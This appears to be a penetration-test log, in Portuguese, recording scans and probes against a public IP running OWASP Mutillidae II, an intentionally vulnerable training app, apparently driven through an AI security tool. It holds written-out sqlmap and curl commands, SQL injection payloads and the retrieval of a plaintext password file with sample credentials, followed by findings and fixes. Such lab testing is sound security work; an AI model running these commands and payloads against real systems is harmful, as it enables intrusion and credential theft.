@@ -1,0 +1,111 @@
+# Comandos de Penetration Test - Alvo: http://44.223.110.126/index.php?page=user-info.php
+# Regra: SEM DOS (Denial of Service)
+# Ferramenta Principal: MCP HexStrike
+# Data de Início: 2025-12-31
+
+# ===== FASE 1: RECONHECIMENTO =====
+
+# 1. Nmap Scan - Portas e Versões de Serviços
+# Comando MCP: mcp_hexstrike-ai_nmap_scan --target 44.223.110.126 --scan_type -sV --ports 80,443,8080,8443
+# Resultado: Porta 80 aberta - Apache httpd 2.4.29 (Ubuntu)
+
+# 2. Nikto Scan - Vulnerabilidades Web
+# Comando MCP: mcp_hexstrike-ai_nikto_scan --target http://44.223.110.126
+# Resultado: Cookies sem httponly, falta de headers de segurança, /robots.txt encontrado, /phpinfo.php encontrado
+
+# 3. Gobuster Scan - Descoberta de Diretórios
+# Comando MCP: mcp_hexstrike-ai_gobuster_scan --url http://44.223.110.126 --mode dir --wordlist /usr/share/wordlists/dirb/common.txt
+# Resultado: Encontrados: /phpmyadmin, /passwords, /phpinfo.php, /robots.txt, /ajax, /classes, /data, /documentation, /images, /includes, /javascript, /styles, /test, /webservices
+
+# 4. SQLMap Scan - Teste de SQL Injection
+# Comando MCP: mcp_hexstrike-ai_sqlmap_scan --url http://44.223.110.126/index.php?page=user-info.php --additional_args "--batch --level=3 --risk=2"
+# Resultado: Parâmetro 'page' pode ser vulnerável a XSS, testes de SQL injection em andamento
+
+# 5. Nuclei Scan - Vulnerabilidades Conhecidas
+# Comando MCP: mcp_hexstrike-ai_nuclei_scan --target http://44.223.110.126 --severity critical,high
+# Resultado: Nenhuma vulnerabilidade crítica/alta encontrada
+
+# 6. FFuf Scan - Descoberta de Diretórios (Alternativa)
+# Comando MCP: mcp_hexstrike-ai_ffuf_scan --url http://44.223.110.126 --wordlist /usr/share/wordlists/dirb/common.txt --mode directory
+# Resultado: Confirmados os mesmos diretórios encontrados pelo Gobuster
+
+# 7. Arjun - Descoberta de Parâmetros
+# Comando MCP: mcp_hexstrike-ai_arjun_parameter_discovery --url http://44.223.110.126/index.php?page=user-info.php
+# Resultado: Nenhum parâmetro adicional descoberto (parâmetro 'page' já conhecido)
+
+# 8. SQLMap Scan Avançado - Teste de SQL Injection
+# Comando MCP: mcp_hexstrike-ai_sqlmap_scan --url http://44.223.110.126/index.php?page=user-info.php --additional_args "--batch --cookie='PHPSESSID=test;showhints=1' --level=5 --risk=3 --dbs"
+# Resultado: Timeouts durante o teste, parâmetro 'page' não parece dinâmico
+
+# ===== FASE 2: EXPLORAÇÃO =====
+
+# 9. Análise do robots.txt
+# Comando: curl -s "http://44.223.110.126/robots.txt"
+# Resultado: Diretórios bloqueados: passwords/, config.inc, classes/, javascript/, owasp-esapi-php/, documentation/, phpmyadmin/, includes/
+
+# 10. Descoberta de Arquivo Sensível
+# Comando: curl -s "http://44.223.110.126/passwords/accounts.txt"
+# Resultado: ENCONTRADO! Arquivo com 23 contas de usuário e senhas em texto plano
+# Credenciais encontradas incluem: admin/adminpass, adrian/somepassword, john/monkey, etc.
+
+# 11. Identificação da Aplicação
+# Comando: curl -s "http://44.223.110.126/index.php?page=user-info.php" -H "Cookie: PHPSESSID=test;showhints=1"
+# Resultado: OWASP Mutillidae II v2.6.67 - Aplicação web vulnerável intencionalmente para testes de segurança
+# Security Level: 0 (Hosed) - Nível mais baixo de segurança
+
+# 12. Testes Manuais de SQL Injection
+# Comando: curl -s "http://44.223.110.126/index.php?page=user-info.php' OR '1'='1" -H "Cookie: PHPSESSID=test;showhints=1"
+# Comando: curl -s "http://44.223.110.126/index.php?page=user-info.php' UNION SELECT NULL--" -H "Cookie: PHPSESSID=test;showhints=1"
+# Comando: curl -s "http://44.223.110.126/index.php?page=user-info.php' AND 1=1--" -H "Cookie: PHPSESSID=test;showhints=1"
+# Comando: curl -s "http://44.223.110.126/index.php?page=user-info.php' AND 1=2--" -H "Cookie: PHPSESSID=test;showhints=1"
+# Resultado: Testes realizados, análise de resposta necessária
+
+# ===== RESUMO DE VULNERABILIDADES ENCONTRADAS =====
+
+# 1. EXPOSIÇÃO DE ARQUIVO SENSÍVEL (CRÍTICO)
+#    - Arquivo /passwords/accounts.txt acessível publicamente
+#    - Contém 23 pares de credenciais em texto plano
+#    - Severidade: CRÍTICA
+
+# 2. COOKIES SEM HTTPONLY FLAG (MÉDIO)
+#    - Cookies PHPSESSID e showhints sem flag httponly
+#    - Vulnerável a roubo via XSS
+#    - Severidade: MÉDIA
+
+# 3. FALTA DE HEADERS DE SEGURANÇA (BAIXO)
+#    - X-Frame-Options ausente (vulnerável a clickjacking)
+#    - X-Content-Type-Options ausente
+#    - Severidade: BAIXA
+
+# 4. APACHE DESATUALIZADO (MÉDIO)
+#    - Apache 2.4.29 (versão desatualizada)
+#    - Versão atual recomendada: 2.4.54+
+#    - Severidade: MÉDIA
+
+# 5. PHPINFO EXPOSTO (MÉDIO)
+#    - /phpinfo.php acessível publicamente
+#    - Expõe informações sensíveis do servidor
+#    - Severidade: MÉDIA
+
+# 6. REVELAÇÃO DE IP INTERNO (BAIXO)
+#    - IP interno 10.0.223.46 revelado via Location header
+#    - Severidade: BAIXA
+
+# 7. POSSÍVEL SQL INJECTION (A INVESTIGAR)
+#    - Parâmetro 'page' na URL pode ser vulnerável
+#    - SQLMap indicou possível vulnerabilidade a XSS
+#    - Testes manuais necessários para confirmação
+#    - Severidade: ALTA (se confirmado)
+
+# ===== RECOMENDAÇÕES =====
+
+# 1. REMOVER IMEDIATAMENTE o arquivo /passwords/accounts.txt ou restringir acesso
+# 2. Implementar autenticação adequada para arquivos sensíveis
+# 3. Adicionar flags httponly e secure aos cookies
+# 4. Implementar headers de segurança (X-Frame-Options, X-Content-Type-Options, etc.)
+# 5. Atualizar Apache para versão mais recente
+# 6. Remover ou restringir acesso ao phpinfo.php
+# 7. Implementar validação e sanitização adequada de parâmetros GET/POST
+# 8. Implementar prepared statements para prevenir SQL Injection
+# 9. Configurar WAF (Web Application Firewall) para proteção adicional
+# 10. Realizar auditoria de segurança regular
